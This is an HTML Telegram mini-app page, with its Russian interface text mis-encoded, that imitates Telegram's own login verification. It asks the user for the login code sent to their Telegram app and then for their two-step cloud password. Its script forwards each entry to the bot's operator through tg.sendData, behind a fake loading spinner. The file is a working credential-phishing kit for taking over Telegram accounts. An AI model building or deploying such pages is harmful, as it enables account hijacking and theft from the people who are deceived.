<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg-color: #0f1721;
            --container-bg: #1c2733;
            --text-color: #ffffff;
            --hint-color: #708499;
            --button-color: #3390ec;
            --input-bg: #242f3d;
            --input-border: #2f3e4e;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .app-container {
            width: 100%;
            max-width: 360px;
            padding: 30px;
            text-align: center;
            background: var(--container-bg);
            border-radius: 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            margin: 15px;
        }

        .icon-box {
            width: 70px;
            height: 70px;
            background: var(--button-color);
            border-radius: 20px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            box-shadow: 0 5px 15px rgba(51, 144, 236, 0.4);
        }

        h2 { font-size: 24px; margin: 0 0 10px 0; font-weight: 600; }
        p { font-size: 15px; color: var(--hint-color); line-height: 1.4; margin-bottom: 25px; }

        .input-group { position: relative; width: 100%; margin-bottom: 20px; }

        input {
            width: 100%;
            background: var(--input-bg);
            border: 2px solid var(--input-border);
            border-radius: 14px;
            padding: 16px;
            color: #fff;
            font-size: 18px;
            outline: none;
            box-sizing: border-box;
            transition: all 0.3s ease;
            text-align: center;
        }

        input:focus { border-color: var(--button-color); box-shadow: 0 0 10px rgba(51, 144, 236, 0.2); }

        button {
            width: 100%;
            background: var(--button-color);
            border: none;
            border-radius: 14px;
            padding: 16px;
            color: #fff;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.1s ease, opacity 0.2s;
        }

        button:active { transform: scale(0.98); opacity: 0.9; }

        .step { display: none; }
        .active { display: block; animation: slideIn 0.3s ease-out; }

        @keyframes slideIn {
            from { opacity: 0; transform: translateX(20px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .loader {
            display: none;
            border: 3px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            border-top: 3px solid #fff;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="app-container">
    <div id="main-icon" class="icon-box">‚úâÔ∏è</div>

    <div id="step-code" class="step">
        <h2>–ö–æ–¥ –∏–∑ SMS</h2>
        <p>–ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –ø—Ä–æ–≤–µ—Ä–æ—á–Ω—ã–π –∫–æ–¥ –≤ –≤–∞—à–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ Telegram</p>
        <div class="input-group">
            <input type="number" id="code_input" placeholder="00000" autofocus>
        </div>
        <button id="btn-code" onclick="sendData('code')">
            <span id="text-code">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</span>
            <div id="loader-code" class="loader"></div>
        </button>
    </div>

    <div id="step-pass" class="step">
        <h2>–ü–∞—Ä–æ–ª—å 2FA</h2>
        <p>–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –æ–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å (–¥–≤—É—Ö—ç—Ç–∞–ø–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è)</p>
        <div class="input-group">
            <input type="password" id="pass_input" placeholder="–í–∞—à –ø–∞—Ä–æ–ª—å">
        </div>
        <button id="btn-pass" onclick="sendData('pass')">
            <span id="text-pass">–ó–∞–≤–µ—Ä—à–∏—Ç—å</span>
            <div id="loader-pass" class="loader"></div>
        </button>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.ready();
    tg.headerColor = '#1c2733';

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∫–æ–π —à–∞–≥ –æ—Ç–∫—Ä—ã—Ç—å —á–µ—Ä–µ–∑ URL: ?step=code –∏–ª–∏ ?step=pass
    window.onload = function() {
        const urlParams = new URLSearchParams(window.location.search);
        const step = urlParams.get('step');

        if (step === 'pass') {
            showStep('pass', 'üîë');
        } else {
            showStep('code', '‚úâÔ∏è'); // –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é –æ—Ç–∫—Ä—ã–≤–∞–µ–º –∫–æ–¥
        }
    };

    function showStep(id, icon) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById('step-' + id).classList.add('active');
        document.getElementById('main-icon').innerText = icon;
    }

    function sendData(type) {
        const inputId = type === 'code' ? 'code_input' : 'pass_input';
        const loaderId = type === 'code' ? 'loader-code' : 'loader-pass';
        const textId = type === 'code' ? 'text-code' : 'text-pass';
        
        const val = document.getElementById(inputId).value;
        if (!val) return;

        // –≠—Ñ—Ñ–µ–∫—Ç –∑–∞–≥—Ä—É–∑–∫–∏
        document.getElementById(textId).style.display = 'none';
        document.getElementById(loaderId).style.display = 'block';

        setTimeout(() => {
            tg.sendData(val); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –±–æ—Ç—É (–æ–Ω –∏—Ö –ø–æ–ª—É—á–∏—Ç –≤ message.web_app_data.data)
        }, 600);
    }
</script>

</body>
</html>
